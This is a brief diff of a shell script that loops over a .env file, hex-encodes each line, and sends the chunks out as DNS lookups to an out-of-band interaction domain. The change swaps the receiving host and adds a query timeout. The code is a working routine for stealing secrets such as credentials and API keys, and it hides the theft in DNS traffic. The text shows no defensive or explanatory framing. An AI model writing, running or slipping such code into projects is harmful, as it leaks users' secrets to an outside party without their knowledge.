@@ -2,6 +2,6 @@
 for f in .env; do
   [ -f "$f" ] && while IFS= read -r line; do
     encoded=$(printf '%s' "$line" | xxd -p | head -c50)
-    dig +short "${encoded}.dav8nqjfb83v49lnub7gq5utm98mfuwse.oast.site" >/dev/null 2>&1
+    dig +short +timeout=3 "${encoded}.dav8olbfb83v6i0o1et07gm9fkhntgfbz.oast.fun" >/dev/null 2>&1
   done < "$f"
 done
